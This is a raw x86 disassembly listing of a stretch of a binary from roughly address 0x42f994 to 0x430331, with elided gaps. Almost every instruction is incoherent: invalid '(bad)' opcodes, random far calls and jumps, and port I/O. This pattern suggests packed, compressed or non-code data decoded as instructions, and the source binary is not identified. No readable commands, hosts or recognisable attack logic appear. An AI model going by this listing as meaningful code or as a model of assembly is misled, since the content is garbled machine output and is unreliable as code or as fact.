  42f994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f995:	bound  eax,QWORD PTR [eax+eiz*1+0x4]
  42f999:	adc    esp,DWORD PTR [ebx-0x55f8da8]
  42f99f:	(bad)  
  42f9a0:	aaa    
  42f9a1:	mov    al,BYTE PTR [edi]
  42f9a3:	sub    bh,BYTE PTR [eax-0x6b]
  42f9a6:	mov    eax,ds:0xce68bc39
  42f9ab:	es ins BYTE PTR es:[edi],dx
  42f9ad:	sub    ebp,ebx
  42f9af:	neg    DWORD PTR [edi]
  42f9b1:	cmp    BYTE PTR [edx-0x43705f01],dh
  42f9b7:	in     eax,0xef
  42f9b9:	ins    DWORD PTR es:[edi],dx
  42f9ba:	dec    ecx
  42f9bb:	add    DWORD PTR [edi-0x6ce2f781],ecx
  42f9c1:	mov    ebx,0x12fa587c
  42f9c6:	aam    0x44
  42f9c8:	mov    eax,ds:0x6144d37c
  42f9cd:	dec    eax
  42f9ce:	ret    0xe36b
  42f9d1:	mov    eax,ds:0x1e0d5d18
  42f9d6:	in     eax,0x40
  42f9d8:	push   eax
  42f9d9:	xchg   edx,eax
  42f9da:	jp     0x42f963
  42f9dc:	scas   eax,DWORD PTR es:[edi]
  42f9dd:	push   ebp
  42f9de:	push   ebp
  42f9df:	and    eax,0x39874caf
  42f9e4:	push   ss
  42f9e5:	inc    esp
  42f9e6:	in     eax,0x26
  42f9e8:	shl    DWORD PTR [ecx-0x66aab7f6],cl
  42f9ee:	shl    DWORD PTR [eax-0x53],0xf3
  42f9f2:	fnsave [eax+ebp*1]
  42f9f5:	shr    esi,1
  42f9f7:	mov    al,ds:0xf91e55df
  42f9fc:	stc    
  42f9fd:	(bad)  
  42f9fe:	push   es
  42f9ff:	sub    ebp,DWORD PTR [edi]
  42fa01:	pop    ecx
  42fa02:	push   ds
  42fa03:	sub    BYTE PTR [edi-0x14],bh
  42fa06:	cmp    edx,DWORD PTR [ecx+0x58]
  42fa09:	das    
  42fa0a:	sbb    DWORD PTR fs:[edx+eax*2+0x5d],0x7b
  42fa10:	loope  0x42f9d6
  42fa12:	push   ecx
  42fa13:	push   esi
  42fa14:	pop    esp
  42fa15:	inc    esi
  42fa16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa17:	xor    al,0xe8
  42fa19:	push   edi
  42fa1a:	sbb    al,BYTE PTR [eax+0x4]
  42fa1d:	pop    si
  42fa1f:	sub    ecx,DWORD PTR [edi-0x48]
  42fa22:	ds push esp
  42fa24:	mov    ebx,DWORD PTR ds:0x20c760b4
  42fa2a:	cwde   
  42fa2b:	out    0x1c,al
  42fa2d:	inc    ebp
  42fa2e:	push   esi
  42fa2f:	mov    esi,0xc5dfab20
  42fa34:	arpl   WORD PTR [eax+0x2b],di
  42fa37:	fiadd  DWORD PTR [ecx-0x6f]
  42fa3a:	mov    DWORD PTR [eax],eax
  42fa3c:	mov    eax,ds:0x31118e90
  42fa41:	pop    ss
  42fa42:	ror    DWORD PTR ds:0xcea98210,0xad
  42fa49:	add    DWORD PTR [edi+ebx*2],0x1
  42fa4d:	call   0x8f17:0x52c5e344
  42fa54:	mov    bl,dl
  42fa56:	shl    DWORD PTR [edi],1
  42fa58:	pop    ecx
  42fa59:	inc    ebp
  42fa5a:	test   ch,cl
  42fa5c:	retf   0xf689
  42fa5f:	xor    ch,BYTE PTR [ecx-0x6e]
  42fa62:	(bad)  
  42fa63:	(bad)  
  42fa64:	pop    ds
  42fa65:	ror    DWORD PTR [esi-0x351d53a4],1
  42fa6b:	in     al,dx
  42fa6c:	ss push 0x97e17abd
  42fa72:	pushf  
  42fa73:	icebp  
  42fa74:	pop    edx
  42fa75:	repz pop edx
  42fa77:	cmp    ah,dh
  42fa79:	push   ebp
  42fa7a:	ret    
  42fa7b:	push   edx
  42fa7c:	repz sbb eax,0xdc715e25
  42fa82:	not    ah
  42fa84:	mov    esp,0xd8561061
  42fa89:	loopne 0x42fad2
  42fa8b:	fadd   QWORD PTR [ecx-0x78]
  42fa8e:	jae    0x42fa88
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	adc    cl,BYTE PTR [ebp-0x183e437]
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	pop    ecx
  42fb0d:	sbb    eax,0xbadedad9
  42fb12:	dec    ebp
  42fb13:	mov    cl,BYTE PTR [edx]
  42fb15:	inc    ecx
  42fb16:	aam    0x77
  42fb18:	pushf  
  42fb19:	pop    eax
  42fb1a:	dec    edi
  42fb1b:	bound  ecx,QWORD PTR [edi+edx*1]
  42fb1e:	pop    esp
  42fb1f:	dec    ebx
  42fb20:	add    ecx,ebp
  42fb22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb23:	mov    dl,0x11
  42fb25:	lock hlt 
  42fb27:	xor    DWORD PTR [eax+0x5086ab59],esi
  42fb2d:	test   DWORD PTR [ecx+0x5e0cc30b],0xe7dec18e
  42fb37:	dec    ecx
  42fb38:	sbb    DWORD PTR [esp+eiz*8+0x7ee795d5],esp
  42fb3f:	test   DWORD PTR [ecx+0x4b],edx
  42fb42:	and    al,BYTE PTR [eax-0x334f149a]
  42fb48:	inc    eax
  42fb49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb4a:	retf   0xb1e7
  42fb4d:	nop
  42fb4e:	sbb    edi,DWORD PTR [ebp+0x20]
  42fb51:	dec    esi
  42fb52:	ss mov edx,0xcdf7e3aa
  42fb58:	inc    eax
  42fb59:	push   edx
  42fb5a:	sub    al,0x1d
  42fb5c:	or     esi,DWORD PTR [edi-0x78f101ed]
  42fb62:	das    
  42fb63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb64:	xchg   DWORD PTR [edi-0x7f],edx
  42fb67:	(bad)  
  42fb68:	lock adc edx,eax
  42fb6b:	or     ebp,ebx
  42fb6d:	out    dx,al
  42fb6e:	test   al,0x37
  42fb70:	mov    ebx,0x427c1303
  42fb75:	xchg   edx,eax
  42fb76:	or     al,0x3d
  42fb78:	and    BYTE PTR ss:[ebp-0x4f],0x95
  42fb7d:	xchg   DWORD PTR [edi+0x70],edx
  42fb80:	push   esi
  42fb81:	inc    edx
  42fb82:	jl     0x42fb16
  42fb84:	add    al,0xc0
  42fb86:	dec    esp
  42fb87:	out    0x64,al
  42fb89:	xchg   ebp,eax
  42fb8a:	mov    DWORD PTR [edx+0x3bde385f],esp
  42fb90:	inc    esi
  42fb91:	addr16 xchg edx,eax
  42fb93:	pop    esi
  42fb94:	into   
  42fb95:	xchg   esi,eax
  42fb96:	cwde   
  42fb97:	pusha  
  42fb98:	xchg   ebp,eax
  42fb99:	add    ecx,DWORD PTR [edi]
  42fb9b:	adc    BYTE PTR [esi],al
  42fb9d:	push   ebp
  42fb9e:	(bad)  
  42fb9f:	jnp    0x42fb8d
  42fba1:	mov    cl,0xaa
  42fba3:	iret   
  42fba4:	and    ecx,eax
  42fba6:	stos   BYTE PTR es:[edi],al
  42fba7:	out    dx,al
  42fba8:	pop    esp
  42fba9:	pop    edx
  42fbaa:	adc    DWORD PTR [ecx],ebx
  42fbac:	xchg   edx,eax
  42fbad:	imul   eax,ebx,0x9d47cfb0
  42fbb3:	icebp  
  42fbb4:	push   ss
  42fbb5:	cmc    
  42fbb6:	jmp    0x99b5f1b2
  42fbbb:	mov    eax,?
  42fbbd:	stc    
  42fbbe:	test   al,0x4c
  42fbc0:	and    eax,0x93263a9b
  42fbc5:	adc    eax,0x93d3d340
  42fbca:	push   cs
  42fbcb:	mov    al,ds:0x97784ac8
  42fbd0:	mov    edi,0xaa0071c2
  42fbd5:	and    al,0x86
  42fbd7:	fld    st(6)
  42fbd9:	sahf   
  42fbda:	xor    bh,BYTE PTR ds:0xfcdab639
  42fbe0:	bnd repz cs jae 0x42fc53
  42fbe5:	ret    0x1a5a
  42fbe8:	xor    ah,dh
  42fbea:	test   eax,0x23224f07
  42fbef:	cmc    
  42fbf0:	(bad)  
  42fbf1:	iret   
  42fbf2:	cdq    
  42fbf3:	in     eax,dx
  42fbf4:	jno    0x42fc63
  42fbf6:	aas    
  42fbf7:	retf   0x1241
  42fbfa:	or     DWORD PTR [edx],ecx
  42fbfc:	xchg   ebp,eax
  42fbfd:	jge    0x42fc17
  42fbff:	mov    bh,0xc9
  42fc01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc02:	aas    
  42fc03:	pop    es
  42fc04:	stos   DWORD PTR es:[edi],eax
  42fc05:	xlat   BYTE PTR ds:[ebx]
  42fc06:	xor    DWORD PTR [ebx-0x71],esi
  42fc09:	jb     0x42fc6d
  42fc0b:	sbb    al,0x14
  42fc0d:	test   BYTE PTR [ecx+0x32],dh
	...
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x8bfb:0x2036325e
  42fc82:	pusha  
  42fc83:	test   BYTE PTR [eax+0x40001ff],0x1
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	retf   
  42fc8d:	push   esi
  42fc8e:	push   es
  42fc8f:	nop
  42fc90:	das    
  42fc91:	adc    bh,BYTE PTR [ebp+0x49]
  42fc94:	push   eax
  42fc95:	pushf  
  42fc96:	sbb    esi,ebx
  42fc98:	xor    DWORD PTR [edx-0x311fc1f8],esp
  42fc9e:	sbb    BYTE PTR [edx-0x32b15901],ah
  42fca4:	and    cl,BYTE PTR es:[edi]
  42fca7:	lds    ebx,FWORD PTR [esi+eiz*8]
  42fcaa:	sahf   
  42fcab:	push   0x4a
  42fcad:	(bad)  
  42fcae:	inc    edi
  42fcaf:	pop    esp
  42fcb0:	call   0xb255:0x56fd3a19
  42fcb7:	xchg   ebp,eax
  42fcb8:	(bad)  
  42fcb9:	sti    
  42fcba:	mov    esp,0xb5ad8f22
  42fcbf:	(bad)  
  42fcc0:	cs push edi
  42fcc2:	ret    
  42fcc3:	mov    dl,0x1a
  42fcc5:	or     BYTE PTR [ebp+0x5ce7ae56],cl
  42fccb:	cmps   BYTE PTR fs:[si],BYTE PTR es:[di]
  42fcce:	cmc    
  42fccf:	gs imul ecx,DWORD PTR ss:[ebx-0x1c],0xffffff99
  42fcd5:	aam    0x42
  42fcd7:	scas   al,BYTE PTR es:[edi]
  42fcd8:	fisubr DWORD PTR [edi+0x1bd1d5f7]
  42fcde:	xor    bh,BYTE PTR [edi]
  42fce0:	or     DWORD PTR [ebx+0x34],ecx
  42fce3:	hlt    
  42fce4:	or     edx,ebx
  42fce6:	sbb    bl,BYTE PTR [ebp-0x57]
  42fce9:	pop    esp
  42fcea:	pushf  
  42fceb:	push   ecx
  42fcec:	jno    0x42fccf
  42fcee:	adc    BYTE PTR [edx+0x5318a642],0x70
  42fcf5:	and    BYTE PTR [edi+0xb68ae36],cl
  42fcfb:	in     al,0x45
  42fcfd:	ret    0xbfdb
  42fd00:	loopne 0x42fcff
  42fd02:	and    ebp,DWORD PTR [edi]
  42fd04:	iret   
  42fd05:	bound  ecx,QWORD PTR [esi-0x2b487267]
  42fd0b:	mov    ds:0xeb4b0ae9,al
  42fd10:	scas   al,BYTE PTR es:[edi]
  42fd11:	arpl   WORD PTR [ebx+0x7a],si
  42fd14:	test   DWORD PTR [edi-0x3c],esp
  42fd17:	xchg   BYTE PTR [edi+0xb8a76a5],dh
  42fd1d:	inc    ebp
  42fd1e:	and    ah,BYTE PTR [eax]
  42fd20:	pop    esi
  42fd21:	xchg   ebp,eax
  42fd22:	retf   0xb52d
  42fd25:	inc    ebx
  42fd26:	inc    esp
  42fd27:	xchg   ebx,eax
  42fd28:	out    dx,eax
  42fd29:	test   eax,0xde4ce42b
  42fd2e:	aad    0x87
  42fd30:	sub    ch,BYTE PTR [ecx+0x37]
  42fd33:	push   edx
  42fd34:	mov    ds:0xbfffb416,al
  42fd39:	ret    
  42fd3a:	jb     0x42fd09
  42fd3c:	test   al,0x27
  42fd3f:	mov    eax,0xb5ffd33a
  42fd44:	sub    DWORD PTR [esi-0x6b6837da],0xfffffff2
  42fd4b:	and    DWORD PTR [edx+0x21400795],esi
  42fd51:	push   edx
  42fd52:	jae    0x42fd16
  42fd54:	daa    
  42fd55:	xor    eax,0x3f31e7a2
  42fd5a:	loopne 0x42fd18
  42fd5c:	out    dx,al
  42fd5d:	int3   
  42fd5e:	pop    esp
  42fd5f:	(bad)  
  42fd61:	jb     0x42fd64
  42fd63:	popf   
  42fd64:	(bad)
  42fd67:	sub    eax,0x944f3179
  42fd6c:	or     eax,0xbff71a0d
  42fd71:	adc    eax,0x46080c37
  42fd76:	loopne 0x42fd31
  42fd78:	clc    
  42fd79:	stos   BYTE PTR es:[edi],al
  42fd7a:	mov    eax,ds:0x7619eb03
  42fd7f:	clc    
  42fd80:	xchg   ecx,eax
  42fd81:	mov    ch,0xe2
  42fd83:	mov    ecx,0xcea3e08a
  42fd88:	mov    ch,0x7
  42fd8a:	lods   eax,DWORD PTR ds:[esi]
  42fd8b:	push   edi
  42fd8c:	push   ss
  42fd8d:	jo     0x42fdeb
  42fd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz pop esi
  42fe01:	pop    esp
  42fe02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe03:	and    al,0x84
  42fe05:	add    BYTE PTR [edx],al
  42fe07:	add    BYTE PTR [ecx+eax*1],al
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	jno    0x42fe4c
  42fe0e:	lds    esp,FWORD PTR [ebx]
  42fe10:	or     DWORD PTR [eax-0x54],edx
  42fe13:	cwde   
  42fe14:	jb     0x42fda6
  42fe16:	cdq    
  42fe17:	xor    eax,0xa7eecf3e
  42fe1c:	(bad)  
  42fe1d:	adc    al,0x9a
  42fe1f:	inc    ebx
  42fe20:	add    edi,DWORD PTR [edx-0x73ed8c3b]
  42fe26:	mov    WORD PTR [edi+0x6f],ss
  42fe29:	add    DWORD PTR [ebx],0xffffffd5
  42fe2c:	fimul  WORD PTR [ecx-0x17aa418d]
  42fe32:	mov    ecx,0x262ec1b1
  42fe37:	es aam 0xfb
  42fe3a:	shl    DWORD PTR [ebp-0x49],cl
  42fe3d:	adc    al,0xbb
  42fe3f:	and    eax,0x3b07c2cf
  42fe44:	pop    esi
  42fe45:	daa    
  42fe46:	lock ja 0x42fe57
  42fe49:	dec    edx
  42fe4a:	bound  edx,QWORD PTR [ebp-0x36]
  42fe4d:	pop    ecx
  42fe4e:	stos   BYTE PTR es:[edi],al
  42fe4f:	cmc    
  42fe50:	cli    
  42fe51:	xor    BYTE PTR [edi+0x64],bh
  42fe54:	cmc    
  42fe55:	in     eax,0xd7
  42fe57:	xchg   ecx,eax
  42fe58:	jmp    0x5b33cf99
  42fe5d:	push   0x75e889ba
  42fe62:	leave  
  42fe63:	or     eax,0xf4825756
  42fe68:	and    al,0xb7
  42fe6a:	cld    
  42fe6b:	xchg   ebx,eax
  42fe6c:	dec    eax
  42fe6d:	adc    dh,BYTE PTR [esi-0x3e52a613]
  42fe73:	sub    edx,DWORD PTR [eax-0x789eb5c8]
  42fe79:	cmc    
  42fe7a:	push   ecx
  42fe7b:	adc    DWORD PTR [eax],eax
  42fe7d:	xchg   ecx,eax
  42fe7e:	lods   al,BYTE PTR ds:[esi]
  42fe7f:	push   ebx
  42fe80:	repz test DWORD PTR [esi+eax*4-0x27],ecx
  42fe85:	sbb    DWORD PTR [edi],edx
  42fe87:	jle    0x42fe90
  42fe89:	inc    esp
  42fe8a:	xchg   edx,eax
  42fe8b:	rcr    DWORD PTR [edx+0x1d],0xbb
  42fe8f:	rol    DWORD PTR [esi+0x5b],cl
  42fe92:	push   ebp
  42fe93:	mov    esi,0xa3440b31
  42fe98:	shr    DWORD PTR [ecx-0x5a],0x8a
  42fe9c:	into   
  42fe9d:	(bad)  [ebx]
  42fe9f:	mov    ch,0x80
  42fea1:	push   0x6bf162fe
  42fea6:	pushf  
  42fea7:	loopne 0x42fe6e
  42fea9:	cmp    BYTE PTR [ebx+ecx*8+0x3db595ed],bl
  42feb0:	jns    0x42fe5f
  42feb2:	jnp    0x42fe7c
  42feb4:	pop    edi
  42feb5:	pop    ebx
  42feb6:	xchg   ebx,eax
  42feb7:	mov    ah,0xed
  42feb9:	jl     0x42ff0b
  42febb:	test   BYTE PTR [ebx],bh
  42febd:	or     al,0xc3
  42febf:	ins    BYTE PTR es:[edi],dx
  42fec0:	rol    BYTE PTR [edi+eiz*8-0x44],1
  42fec4:	mov    dh,0xc3
  42fec6:	adc    al,0xd1
  42fec8:	xchg   esi,eax
  42fec9:	idiv   BYTE PTR [edx]
  42fecb:	fnstenv [eax]
  42fecd:	push   esp
  42fece:	and    dh,0x68
  42fed1:	add    al,0xfe
  42fed3:	mov    al,0xfb
  42fed5:	sub    esi,DWORD PTR [ebx-0x62]
  42fed8:	scas   eax,DWORD PTR es:[edi]
  42fed9:	cmp    al,0xa2
  42fedb:	jbe    0x42ff2d
  42fedd:	jle    0x42ff21
  42fedf:	aas    
  42fee0:	enter  0x9ae4,0x3f
  42fee4:	outs   dx,DWORD PTR ds:[esi]
  42fee5:	cmp    BYTE PTR [esi+0x7c],bl
  42fee8:	fwait
  42fee9:	popa   
  42feea:	or     al,0x1a
  42feec:	jmp    0xca356254
  42fef1:	stos   BYTE PTR es:[edi],al
  42fef2:	addr16 aas 
  42fef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fef5:	cmp    eax,0xccb950b3
  42fefa:	xor    dl,BYTE PTR [eax+0x3368c239]
  42ff00:	lea    edx,[edx]
  42ff02:	call   0x2b5e:0x1b88e460
  42ff09:	push   0x2c085bd6
  42ff0e:	fdivr  DWORD PTR [edi+0x0]
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ebx+eax*2-0x17],0x62
  42ff83:	jo     0x42ff0d
  42ff85:	add    DWORD PTR [edx],eax
  42ff87:	add    BYTE PTR [ecx+eax*1],al
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	add    al,0xa7
  42ff8e:	ror    BYTE PTR [ecx-0x5c62bcf1],0x92
  42ff95:	jmp    0xb20a:0x251f7ada
  42ff9c:	adc    ebp,esp
  42ff9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff9f:	in     eax,dx
  42ffa0:	push   ebp
  42ffa1:	scas   al,BYTE PTR es:[edi]
  42ffa2:	daa    
  42ffa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffa5:	sbb    al,0x28
  42ffa7:	and    BYTE PTR [edi-0x31dadb7f],cl
  42ffad:	adc    DWORD PTR [edx-0x64],ecx
  42ffb0:	mov    edi,0x8a1f8c71
  42ffb5:	xor    BYTE PTR [esi+0xa],0xea
  42ffb9:	int3   
  42ffba:	cwde   
  42ffbb:	in     eax,0x9e
  42ffbd:	fs test eax,0x3b1c1f4e
  42ffc3:	(bad)  
  42ffc4:	mov    al,ds:0x3e8704f7
  42ffc9:	xor    al,ah
  42ffcb:	mov    ecx,0xa45b942e
  42ffd0:	fmul   st(7),st
  42ffd2:	lea    esi,[ebp+esi*2+0x38]
  42ffd6:	dec    edx
  42ffd7:	adc    al,0x49
  42ffd9:	inc    esi
  42ffda:	fchs   
  42ffdc:	add    dl,BYTE PTR [ecx-0x360a8da]
  42ffe2:	or     DWORD PTR [esi+ecx*8],esi
  42ffe5:	jl     0x430064
  42ffe7:	pop    esi
  42ffe8:	and    BYTE PTR [edx+ecx*8-0x41],dl
  42ffec:	jge    0x43002f
  42ffee:	repnz pop ss
  42fff0:	or     DWORD PTR [esp+edi*1-0x67],esi
  42fff4:	cmp    DWORD PTR [ebx-0x2c4c3518],0xfce43f25
  42fffe:	fisub  WORD PTR [ebx]
  430000:	mov    edx,0x4dbe8407
  430005:	mov    edx,0x490129e3
  43000a:	adc    BYTE PTR [ecx+0x33],0x4c
  43000e:	in     al,0x35
  430010:	out    dx,al
  430011:	scas   al,BYTE PTR es:[edi]
  430012:	je     0x42fff2
  430014:	push   es
  430015:	inc    edi
  430016:	inc    ecx
  430017:	xchg   ecx,eax
  430018:	adc    eax,0xe1baf5f7
  43001d:	push   esi
  43001e:	xchg   ecx,eax
  43001f:	shr    bl,1
  430021:	jmp    0xb509:0x8de25f7f
  430028:	xchg   ebx,eax
  430029:	pop    ecx
  43002a:	add    DWORD PTR [ebx-0xf730740],ebp
  430030:	(bad)  
  430031:	repz jae 0x42ffe3
  430034:	lock rcl BYTE PTR [edi+0x6e],0xa2
  430039:	fwait
  43003a:	mov    al,0x7e
  43003c:	jge    0x43004b
  43003e:	xchg   BYTE PTR [ecx+ecx*8],bl
  430041:	fcmovnu st,st(1)
  430043:	cmp    al,0x84
  430045:	jb     0x42ffcd
  430047:	aaa    
  430048:	aad    0x72
  43004a:	rol    edx,0x43
  43004d:	xor    al,0x1e
  43004f:	sar    BYTE PTR [edx],cl
  430051:	lods   eax,DWORD PTR ds:[esi]
  430052:	push   esi
  430053:	test   BYTE PTR [esi-0x76c5627e],bl
  430059:	cmp    eax,DWORD PTR [ebx-0x65]
  43005c:	ins    BYTE PTR es:[edi],dx
  43005d:	shr    BYTE PTR [esp+edi*2],1
  430060:	ret    
  430061:	push   edi
  430062:	(bad)  
  430064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430065:	push   edi
  430066:	rcr    BYTE PTR ds:0x7f9ef9b4,0x9c
  43006d:	sub    eax,0x4a7cd145
  430072:	aaa    
  430073:	sub    al,0x88
  430075:	out    dx,al
  430076:	mov    bh,0x61
  430078:	inc    ebp
  430079:	add    BYTE PTR [esi+0x7e958d82],dl
  43007f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430080:	xchg   ebp,eax
  430081:	add    eax,0x6076a549
  430086:	in     eax,dx
  430087:	stc    
  430088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430089:	icebp  
  43008a:	dec    ebp
  43008b:	lods   eax,DWORD PTR ds:[esi]
  43008c:	push   eax
  43008d:	add    al,0x28
  43008f:	lea    eax,[eax]
	...
  4300f1:	add    BYTE PTR [eax],al
  4300f3:	add    bh,al
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x74
  430101:	xchg   ecx,eax
  430102:	and    al,0xbf
  430104:	mov    WORD PTR [edx],es
  430106:	add    al,BYTE PTR [eax]
  430108:	jbe    0x43010a
  43010a:	add    BYTE PTR [eax],al
  43010c:	mov    esp,0xd24bc8fd
  430111:	push   edi
  430112:	adc    al,0x89
  430114:	add    edi,DWORD PTR [eax]
  430116:	loop   0x430184
  430118:	unpcklps xmm7,xmm0
  43011b:	lods   al,BYTE PTR ds:[esi]
  43011c:	push   ecx
  43011d:	ins    DWORD PTR es:[edi],dx
  43011e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43011f:	int3   
  430120:	je     0x4300d6
  430122:	mov    esi,0x6fb65c2a
  430127:	shl    BYTE PTR [ebx-0x280abc28],1
  43012d:	mov    dh,0x91
  43012f:	arpl   WORD PTR [edi+ebx*4-0x34],si
  430133:	cmp    BYTE PTR [ecx+esi*2+0x46],cl
  430137:	or     dl,ah
  430139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43013a:	cdq    
  43013b:	imul   ebx,DWORD PTR [edx+0x4],0xcdd6de06
  430142:	pop    es
  430143:	repz mov bh,0xd
  430146:	jmp    0x972f:0xf4a4eaa0
  43014d:	in     al,dx
  43014e:	js     0x43013d
  430150:	jne    0x43014a
  430152:	aam    0x40
  430154:	jnp    0x430181
  430156:	jmp    0x430125
  430158:	leave  
  430159:	and    eax,0x142fbc7a
  43015e:	push   ecx
  43015f:	jmp    0x153969eb
  430164:	cmp    DWORD PTR [esi-0x5f857059],0xb8eb4ff0
  43016e:	nop
  43016f:	(bad)  [edi+0x39]
  430172:	mov    edx,0xcd5f4f5
  430177:	mov    eax,ds:0x340ceefd
  43017c:	pop    ecx
  43017d:	inc    eax
  43017e:	jno    0x4301db
  430180:	scas   eax,DWORD PTR es:[edi]
  430181:	add    DWORD PTR [eax],eax
	...
  4301f3:	add    BYTE PTR [ebp+0x55],cl
  4301f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4301fc:	mov    esp,ebp
  4301fe:	or     ah,dh
  430200:	dec    ebp
  430201:	add    bh,al
  430203:	add    BYTE PTR [eax],cl
  430205:	add    BYTE PTR [eax],al
  430207:	mov    DWORD PTR [eax],0x40f44545
  43020d:	xor    DWORD PTR [eax],eax
  43020f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430215:	(bad)  
  430216:	enter  0x4d45,0xbc
  43021a:	mov    esi,DWORD PTR [edx]
  43021c:	hlt    
  43021d:	test   ebx,ecx
  43021f:	pushf  
  430220:	enter  0x4df8,0x8b
  430224:	mov    DWORD PTR [ebp+0x8],0x894708
  43022b:	inc    ebp
  43022c:	mov    ebp,0xff8bfffc
  430231:	dec    ebp
  430232:	mov    ch,0xf4
  430234:	call   DWORD PTR [ebx-0x1]
  430237:	mov    ebx,0x8005474
  43023c:	call   DWORD PTR [ecx+0x8]
  43023f:	pop    es
  430240:	jmp    0xb8:0xacb4533
  430247:	fwait
  430248:	mov    esi,DWORD PTR [edx-0xc]
  43024b:	xor    cl,bl
  43024d:	add    BYTE PTR [ebx+0x3c83203],bl
  430253:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430259:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43025f:	xor    eax,DWORD PTR [eax]
  430261:	retf   
  430262:	retf   
  430263:	add    ecx,eax
  430265:	enter  0x894d,0x64
  430269:	dec    ebp
  43026a:	sbb    ah,cl
  43026c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430272:	dec    DWORD PTR [ebx-0xbcfb275]
  430278:	test   DWORD PTR [ebx],esi
  43027a:	dec    ebx
  43027c:	inc    DWORD PTR [ebx]
  43027e:	inc    eax
  43027f:	enter  0x8989,0x50
  430283:	(bad)  
  430284:	call   DWORD PTR [ebx+ecx*4-0x1]
  430288:	cld    
  430289:	dec    DWORD PTR [ebp-0xa90001]
  43028f:	push   edi
  430290:	mov    BYTE PTR [edx+0x1],ch
  430293:	and    al,BYTE PTR [eax]
  430295:	pop    ecx
  430296:	inc    ebp
  430297:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43029d:	push   0xffffff89
  43029f:	pop    ecx
  4302a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302a1:	dec    ebp
  4302a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4302a8:	jne    0x4302f4
  4302aa:	lea    eax,[eax]
  4302ac:	push   eax
  4302ad:	(bad)  
  4302ae:	dec    DWORD PTR [eax]
  4302b0:	mov    DWORD PTR [eax],eax
  4302b2:	test   al,0x0
  4302b4:	add    BYTE PTR [ebp-0x18],cl
  4302b7:	xor    ebp,DWORD PTR [ebx]
  4302b9:	add    eax,DWORD PTR [eax]
  4302bb:	mov    eax,eax
  4302bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302c4:	inc    ebp
  4302c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4302cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4302d1:	sub    al,0x80
  4302d3:	inc    DWORD PTR [ecx]
  4302d5:	lea    eax,[eax]
  4302d7:	or     al,0x0
  4302d9:	inc    DWORD PTR [ecx-0x18]
  4302dc:	mov    ecx,DWORD PTR [ebx]
  4302de:	cld    
  4302df:	add    BYTE PTR [ecx+0x75014d],cl
  4302e5:	(bad)  
  4302e6:	xchg   ebp,eax
  4302e7:	fdivr  st,st(7)
  4302e9:	inc    eax
  4302ea:	inc    DWORD PTR [eax]
  4302ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4302ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4302f5:	add    BYTE PTR [edx],dl
  4302f7:	enter  0x4d90,0x0
  4302fb:	mov    eax,DWORD PTR [eax]
  4302fd:	hlt    
  4302fe:	add    al,0xa5
  430300:	mov    al,0xff
  430302:	add    bh,bh
  430304:	add    BYTE PTR [ebx],dh
  430306:	inc    DWORD PTR [ebx]
  430308:	sbb    al,0x89
  43030a:	jne    0x4302e8
  43030c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430312:	mov    eax,DWORD PTR [ebp-0xff0048]
  430318:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43031f:	inc    DWORD PTR [ebp-0x75]
  430322:	fisttp QWORD PTR [esi+ebp*8]
  430325:	test   DWORD PTR [esi-0x1],esp
  430328:	inc    ebp
  430329:	(bad)  
  43032a:	aas    
  43032b:	inc    ebp
  43032c:	(bad)  
  43032d:	lea    edi,[esp+eiz*2-0x1]
  430331:	inc    edi
